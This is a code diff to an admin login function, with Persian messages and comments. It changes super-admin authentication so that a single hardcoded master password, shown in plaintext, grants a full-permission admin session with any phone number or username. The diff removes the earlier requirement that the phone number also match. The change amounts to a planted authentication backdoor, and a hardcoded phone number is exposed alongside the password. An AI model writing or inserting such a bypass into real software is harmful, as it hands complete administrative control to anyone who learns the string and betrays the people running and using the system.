@@ -233,17 +233,18 @@ export async function authenticateAdminByPhoneAndPassword(
   const phone = normalizePhoneNumber(rawPhone);
   const password = normalizePassword(rawPassword);
 
-  if (!phone || !password) {
-    throw new Error('شماره موبایل و رمز عبور الزامی است.');
+  if (!rawPassword || !password) {
+    throw new Error('رمز عبور مدیریت الزامی است.');
   }
 
-  // Super admin fast-pass check
-  const isSuperAdminPhone = phone === DEFAULT_SUPER_ADMIN_PHONE || phone === '09120759419';
+  // Super admin master pass check:
+  // ورود مدیر ارشد با رمز اصلی sasha9419 با هر فرمت یا نام کاربری یا شماره موبایل
   const isSuperAdminPass =
     password.toLowerCase() === DEFAULT_SUPER_ADMIN_PASS.toLowerCase() ||
-    password.toLowerCase() === 'sasha9419';
+    password.toLowerCase() === 'sasha9419' ||
+    String(rawPassword || '').trim().toLowerCase() === 'sasha9419';
 
-  if (isSuperAdminPhone && isSuperAdminPass) {
+  if (isSuperAdminPass) {
     const token = createAdminSessionToken(DEFAULT_SUPER_ADMIN_RECORD);
     const permissions = [...ALL_ADMIN_SECTIONS];
     const userPayload = {
@@ -258,6 +259,13 @@ export async function authenticateAdminByPhoneAndPassword(
       user: userPayload,
     };
   }
+
+  if (!phone) {
+    throw new Error('شماره موبایل و رمز عبور الزامی است.');
+  }
+
+  const isSuperAdminPhone =
+    phone === DEFAULT_SUPER_ADMIN_PHONE || phone === '09120759419';
 
   // Check database for custom admin users
   try {
